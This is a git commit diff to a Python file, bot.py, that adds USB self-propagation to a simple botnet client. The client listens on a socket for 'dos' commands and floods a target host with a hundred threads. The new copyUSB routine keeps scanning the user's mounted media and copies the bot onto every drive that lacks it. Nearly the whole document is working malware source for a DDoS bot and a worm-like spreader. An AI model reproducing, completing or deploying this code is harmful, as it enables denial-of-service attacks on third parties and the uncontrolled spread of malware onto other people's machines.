6ed82bdfe9788741fb2bf160f2c192ca17e7f0be
louis <louis.barraque@gmail.com>
2019-12-16 20:59:54 +0100

    bot with slef copy into usb

--- bot.py
+++ bot.py
@@ -1,4 +1,4 @@
-#!/usr/bin/env python
+#!/usr/bin/python
 
 import socket
 import threading
@@ -9,19 +9,34 @@ class Bot:
         self.co = socket.socket()
         self.co.connect(("localhost",12222))
         self.co.close()
+	
+	t = threading.Thread(target=self.copyUSB)
+	t.start()
 
         self.botServerSocket = socket.socket()
         self.botServerSocket.setsockopt(\
                  socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         self.botServerSocket.bind(('',12345))
         self.botServerSocket.listen(1)
-        connection, addr = self.botServerSocket.accept()
-        print addr
-        response = connection.recv(255)
-        response = response.split(' ')
-        if  response[0] == "dos":
-            self.attack(response[1],int(response[2]))
-    
+        while(1):
+            connection, addr = self.botServerSocket.accept()
+            print addr
+            response = connection.recv(255)
+            response = response.split(' ')
+            if  response[0] == "dos":
+                self.attack(response[1],int(response[2]))
+
+    def copyUSB(self):
+	lofin = os.getlogin()
+	src = os.path.dirname(os.path.abspath(__file__))+"/bot.py"
+	while (1):
+            if len(os.listdir("/media/"+lofin)) > 0:
+                for clef in os.listdir("/media/"+lofin):
+                    os.path.isfile("/media/"+lofin+"/"+clef+"/bot.py")
+                    if not os.path.isfile("/media/"+lofin+"/"+clef+"/bot.py"):
+                        destination = "/media/"+lofin +"/" + str(clef)
+                        os.system("/bin/cp " + src + " " + destination)
+
     def attack(self,host,port):
         for i in range(100):
             t = threading.Thread(target=self.dos,args=(host,port,))
